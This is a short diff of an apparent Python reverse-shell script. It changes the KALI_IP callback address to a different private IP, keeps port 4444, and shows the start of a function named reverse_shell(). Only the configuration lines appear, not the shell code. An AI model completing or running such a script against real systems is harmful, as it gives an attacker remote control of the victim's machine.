@@ -5,7 +5,7 @@ import os
 import sys
 
 # CHANGE THIS TO YOUR KALI IP AND PORT
-KALI_IP = "192.168.1.112"
+KALI_IP = "192.168.100.4"
 KALI_PORT = 4444
 
 def reverse_shell():
